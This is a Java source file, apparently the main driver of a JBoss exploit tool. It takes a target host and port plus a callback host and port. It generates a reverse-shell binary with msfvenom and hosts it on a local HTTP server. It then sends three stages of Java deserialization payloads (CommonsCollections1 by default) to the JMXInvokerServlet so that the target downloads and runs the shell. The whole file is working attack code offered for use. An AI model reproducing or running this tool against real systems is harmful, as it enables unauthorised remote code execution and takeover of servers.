package jbossexploit;

import org.apache.commons.cli.CommandLine;


public class Main {

    public static void main(String[] args) {
        String binaryName = Msfvenom.generateBinaryName();

        // Parse arguments
        CommandLine cmd = Cli.parseArguments(args);

        String rhost = cmd.getOptionValue("rhost");
        int rport = Integer.parseInt(cmd.getOptionValue("rport"));
        String lhost = cmd.getOptionValue("lhost");
        int lport = Integer.parseInt(cmd.getOptionValue("lport"));
        int srvport = Integer.parseInt(cmd.getOptionValue("srvport"));
        String uripath = cmd.getOptionValue("uripath");
        // If URI isn't specified, set it to /invoker/JMXInvokerServlet
        if (uripath == null) {
            uripath = "/invoker/JMXInvokerServlet";
        }
        // If payload isn't specified, set it to CommonsCollections1
        String payloadname = cmd.getOptionValue("payload");
        if (payloadname == null) {
            payloadname = "CommonsCollections1";
        }

        System.out.println("Generating reverse shell binary with msfvenom at /tmp/" + binaryName + "...");
        Msfvenom.generateBinary(lhost, lport, binaryName);

        System.out.println("Starting HTTP Server...");
        hostFile(srvport);

        System.out.println("Sending serialized commands...");
        int stage;
        for (stage = 0; stage < 3; stage++) {
            System.out.println("Sending stage " + stage);
            Stager.sendPayload(stage, rhost, rport, lhost, srvport, binaryName, uripath, payloadname);
        }
    }



    public static void hostFile(int srvport) {
        final int port = srvport;
        final HttpFileServer server = new HttpFileServer();

        new Thread() {
            @Override
            public void run() {
                try {
                    server.main(port);
                } catch (Exception e) {
                    System.out.println("Could not start HTTP Server.");
                    System.exit(1);
                }
            }
        }.start();
    }
}
